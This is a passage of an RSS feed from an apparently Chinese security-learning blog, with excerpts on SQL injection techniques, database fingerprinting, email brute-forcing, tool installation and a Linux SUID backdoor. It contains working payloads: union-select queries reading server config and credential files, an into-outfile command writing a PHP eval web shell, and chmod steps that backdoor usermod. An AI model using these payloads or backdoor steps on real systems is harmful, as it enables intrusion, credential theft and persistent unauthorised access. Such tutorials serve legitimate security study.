      <link>http://wyb0.com/posts/injection-of-mysql-function/</link>
      <pubDate>Mon, 20 Jun 2016 08:10:27 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/injection-of-mysql-function/</guid>
      <description>0x00 load_file()  条件:  1. 要有file_priv权限 2. 知道文件绝对路径 3. 能使用union 4. 对web目录有读权限 注：若过滤了单引号，则可以将函数中的字符进行hex编码   一般步骤
 读/etc/init.d下的东西，这里有配置文件路径
?id=1&#39; union select 1,2,load_file(&#39;/etc/init.d/httpd&#39;)  得到web安装路径
?id=1&#39; union select 1,2,load_file(&#39;/etc/apache/conf/httpd.conf&#39;)  读取密码文件
?id=1&#39; union select 1,2,load_file(&#39;/site/xxx.com/conf/conn.inc.php&#39;)    0x01 into outfile  条件：  1. 要有file_priv权限 2. 知道网站绝对路径 3. 要能用union 4. 对web目录有写权限 5. 没有过滤单引号   一般方法
当知道路径时，可以直接用?id=1 union select &amp;ldquo;&amp;lt;?php @eval($_POST[&amp;lsquo;c&amp;rsquo;]);?&amp;gt;&amp;rdquo; into outfile(&amp;ldquo;C:/phpStudy/WWW/a.php&amp;rdquo;)
 其他方法
 登陆phpMyAdmin
use test; 选择数据库为test create table aaa(bbb varchar(64)); 在数据库中创建一个表aaa insert into aaa values(&amp;quot;&amp;lt;?</description>
    </item>
    
    <item>
      <title>SQL注入之判断数据库类型</title>
      <link>http://wyb0.com/posts/injection-of-check-database-type/</link>
      <pubDate>Sun, 19 Jun 2016 22:15:52 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/injection-of-check-database-type/</guid>
      <description>0x00 常见手段 扫描端口、指纹、抓包查看http头信息、在网址后面直接判断
0x01 根据各数据库特有函数判断  Access:
and (select count(*) from MSysAccessObjects)&amp;gt;0 返回正常说明是access and exists(select count(*) from表) ID=1 and (select count (*) from sysobjects)&amp;gt;0 返回异常 ID=1 and (select count (*) from msysobjects)&amp;gt;0返回异常  SQLServer:
and (select count(*) from sysobjects) &amp;gt;0 返回正常说明是mssql ID=1 and (select count (*) from sysobjects)&amp;gt;0 返回正常 ID=1 and (select count (*) from msysobjects)&amp;gt;0返回异常 ID=1 and left(version(),1)=5%23 //红色字体也可能是4 ID=1 and exists(select id from sysobjects) ID=1 and len(user)&amp;gt;0 ID=1 CHAR(97)+CHAR(110)+CHAR(100)+CHAR(32)+CHAR(49)+CHAR(61)+CHAR(49)  MySQL:</description>
    </item>
    
    <item>
      <title>SQL注入</title>
      <link>http://wyb0.com/posts/injection/</link>
      <pubDate>Sun, 19 Jun 2016 19:40:25 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/injection/</guid>
      <description>0x00 含义 sql注入是将代码插入(拼接)到应用(用户)的输入参数中，之后再将这些参数传递给后台的SQL服务器加以解析并执行的攻击，
总结起来就是攻击者将恶意代码拼接到sql语句并加以执行从而得到数据的过程。
0x01 成因 SQl语句未对用户参数进行严格过滤  0x02 可引发注入的地方 其实只要是客户端可控、参数值代入数据库查询的地方都可能存在注入 常见的如下，按出现频率排序： 1. GET 2. POST 3. X-Forwarded-For 4. Cookie 5. User-Agent  0x03 注入分类 根据语法(较权威)： 1. 可联合查询注入: 只要页面有显示位即可使用，且注入速度很快 2. 报错型注入: 没有显示位但用echo &amp;quot;mysql_error()&amp;quot;输出了错误信息，速度很快，但是语句较复杂 3. 布尔型注入: 一次一个字节，速度慢，但只要有注入就能用 4. 基于时间延迟注入: 超级慢，比布尔型注入慢几倍，但是通用性较强 5. 可多语句查询: 只有SQL Server可以使用 根据类型： 1. 整形 2. 字符串型 3. 搜索型  0x04 查找注入点 在URL中： 1. and 1=1/and 1=2(整型) 2. 随即输入(整型) 3. -1/+1 回显上下页面(整型) 4. 单引号(字符型/整型) 5. and sleep(5) (判断页面返回时间) 在http头： 1.</description>
    </item>
    
    <item>
      <title>渗透测试流程(单台服务器)</title>
      <link>http://wyb0.com/posts/pentest-process/</link>
      <pubDate>Sun, 19 Jun 2016 19:31:33 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/pentest-process/</guid>
      <description> 针对单台服务器的渗透流程 </description>
    </item>
    
    <item>
      <title>使用theHarvester得到邮箱</title>
      <link>http://wyb0.com/posts/theharvester-blasting-email/</link>
      <pubDate>Thu, 12 May 2016 15:27:14 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/theharvester-blasting-email/</guid>
      <description> 0x00 软件 使用theHarvester搜集邮箱 使用dnsenum得到邮箱服务器域名 使用nmap查看端口开启情况 使用Hydra进行弱口令猜解  0x01 设置Shadowsocks为全局模式: 0x02 得到邮箱 可在theHarvester下载theHarvester，得到邮箱后做成字典user.txt 0x03 得到邮箱服务器域名 0x04 nmap确认端口开启 0x05 Hydra爆密码 0x06 尝试登陆 </description>
    </item>
    
    <item>
      <title>Nessus的安装</title>
      <link>http://wyb0.com/posts/nessus-install/</link>
      <pubDate>Wed, 11 May 2016 17:09:10 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/nessus-install/</guid>
      <description> 0x00 下载Nessus的deb安装包: 去【这里】，选择家庭版，然后下载对应的安装包 0x01 本地安装nessus: 0x02 执行后续安装步骤:  启动nessus  web访问nessus服务  设置账户和密码  申请code，可以在【这里】申请  去邮箱查找code  将code填入，然后等待插件的下载   0x03 登陆Nessus: </description>
    </item>
    
    <item>
      <title>Nmap思维导图</title>
      <link>http://wyb0.com/posts/nmap-mind-mapping/</link>
      <pubDate>Tue, 10 May 2016 20:24:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/nmap-mind-mapping/</guid>
      <description> nmap思维导图如下： </description>
    </item>
    
    <item>
      <title>Linux之安装ettercap</title>
      <link>http://wyb0.com/posts/linux-install-ettercap/</link>
      <pubDate>Tue, 19 Apr 2016 20:03:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/linux-install-ettercap/</guid>
      <description>0x00 准备 操作系统：CentOS 首先，ettercap安装时需要4个依赖包，而且安装包里面也已经提供了 执行：sudo yum groupinstall &amp;quot;Development tools&amp;quot; #源码安装软件就需要安装这个 使用wget下载ettercap源码  0x01 查看需要的依赖项 [wyb@localhost ettercap-0.8.2]$ vim INSTALL #### Bundled libraries Ettercap now bundles the following libraries with the source distribution: libnet 1.1.6 curl 7.41.0 luajit 2.0.3 check 0.9.14 [wyb@localhost ettercap-0.8.2]$ cd bundled_deps/ [wyb@localhost bundled_deps]$ ls check curl libnet luajit  0x02 安装依赖包  安装check
[wyb@localhost check]$ cd check-0.9.14 [wyb@localhost check-0.9.14]$ ls [wyb@localhost check-0.9.14]$ ./configure [wyb@localhost check-0.9.14]$ make [wyb@localhost check-0.</description>
    </item>
    
    <item>
      <title>Linux之SUID后门</title>
      <link>http://wyb0.com/posts/linux-suid-back-door/</link>
      <pubDate>Mon, 18 Apr 2016 20:03:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/linux-suid-back-door/</guid>
      <description>SUID可以用来做后门，前提是你已经获取了root权限，且给予s权限的文件必须为二进制
0x00 为二进制文件添加s权限从而提升为root权限  写sudoers添加用户 //最佳方案
 vim /etc/passwd //将uid和gid改为0 vim /etc/shadow //密文覆盖
 vim root .ssh/证书文件 .ssh这个文件夹和证书的权限要正确，要和原来一致  0x01 SUID主要作用可以是留后门  在root权限下给usermod一个s权限
# which usermod #得到usermod的路径 /usr/sbin/usermod # chmod u+s /usr/sbin/usermod # ls -l /usr/sbin/usermod -rwsr-x---. 1 root root 98680 Dec 7 2011 /usr/sbin/usermod  usermod给其他人一个x权限
[root@localhost ~]# chmod o+x /usr/sbin/usermod [root@localhost ~]# ls -l /usr/sbin/usermod -rwsr-x--x. 1 root root 98680 Dec 7 2011 /usr/sbin/usermod  切换到普通用户wyb
[wyb@localhost ~]$ id wyb uid=500(wyb) gid=500(wyb) groups=500(wyb) [wyb@localhost ~]$ usermod -g root wyb [wyb@localhost ~]$ id wyb uid=500(wyb) gid=0(root) groups=0(root) [wyb@localhost ~]$ exit  验证</description>
    </item>
    
    <item>
      <title>各种参数类型注入</title>
      <link>http://wyb0.com/posts/various-parameter-types-injected/</link>
      <pubDate>Sun, 20 Dec 2015 20:08:47 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/various-parameter-types-injected/</guid>
      <description>0x00 分类 根据注入时提交的变量参数类型，SQL注入点有不同的分类，不同的注入点，其注入时需要注意的事项也有所不同。按提交参数类型，SQL注入点主要分为下面3种：即数字型注入点、字符型注入点和搜索型注入点
0x01 数字型注入点 形如&amp;rdquo;http://www.xxx.com/a.asp?ID=55&amp;quot; ，这类注入的参数是&amp;rdquo;数字&amp;rdquo;，因此称为&amp;rdquo;数字型注入点&amp;rdquo;。 此类注入点提交的SQL语句，其原形大致为：select * from 表名 where 字段=55
当提交&amp;rdquo;http://www.xxx.com/a.asp?ID=55 And [查询条件]&amp;ldquo;时，向数据库提交的完整SQL语句为：
select * from 表名 where 字段=55 and [查询条件]
0x02 字符型注入点 形如&amp;rdquo;http://www.xxx.com/a.asp?Class=0123&amp;quot;这类注入的参数是&amp;quot;字符&amp;quot;，称为&amp;quot;字符型&amp;quot;注入点。
此类注入点提交的 SQL 语句，其原形大致为：
select * from 表名 where 字段=&amp;lsquo;日期&amp;rsquo;
当提交&amp;rdquo;http://www.xxx.com/a.asp?Class=日期 And [查询条件]&amp;ldquo;时，向数据库提交的SQL语句为：
select * from 表名 where 字段=&amp;lsquo;日期&amp;rsquo; and [查询条件]
0x03 搜索型注入点 这是一类特殊的注入类型。
这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有&amp;rdquo;keyword=关键字&amp;rdquo;，有的不显示的链接地址，而是直接通过搜索框表单提交。
此类注入点提交的 SQL 语句，其原形大致为：
select * from 表名 where 字段 like &amp;lsquo;%关键字%&amp;rsquo;
当我们提交注入参数为&amp;rdquo;keyword=&amp;lsquo;and[查询条件] and &amp;lsquo;%&amp;rsquo;=&amp;lsquo;,则向数据库提交的完整SQL语句为：
select * from 表名 where 字段 like &amp;lsquo;%&amp;rsquo; and [查询条件] and &amp;lsquo;%&amp;rsquo;=&amp;lsquo;%&amp;rsquo;</description>
    </item>
    
    <item>
      <title>ASP简单Cookie注入</title>
      <link>http://wyb0.com/posts/cookie-injection-of-asp/</link>
      <pubDate>Fri, 04 Dec 2015 19:42:19 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/cookie-injection-of-asp/</guid>
      <description> 0x00 Cookie注入的使用  三大Web提交方式
 GET：直接在浏览器上面访问地址
 POST：提交表单(会员注册、文件上传等)
 COOKIE：访问网站下面自带的身份验证的值  Cookie注入利用时机
当用普通注入时，采用and 1=1时出现错误提示(如下图)，普通的注入就没办法了，可以尝试大小写，编码等绕过，若过滤严谨，无法绕过，这时就可以采用cookie注入。  利用方法
 可以利用注入中转 可以利用sqlmap   0x01 用注入中转进行Cookie注入  目标：http://localhost:81/2/shownews.asp?id=183
 打开注入中转这个工具，填入相应参数，然后点击生成ASP，将生成的asp文件(jmCook.asp)放入你自己搭建的网站内后即可进行注入  提交localhost:81/jmCook.asp?jmdcw=183 order by猜测字段数
 提交localhost:81/jmCook.asp?jmdcw=183 UNION SELECT 1,2,3,4 from XXX猜测表名  猜测内容   0x02 用sqlmap进行Cookie注入  sqlmap验证存在Cookie注入  猜表名  猜列名  猜字段内容   </description>
    </item>
    
  </channel>
</rss>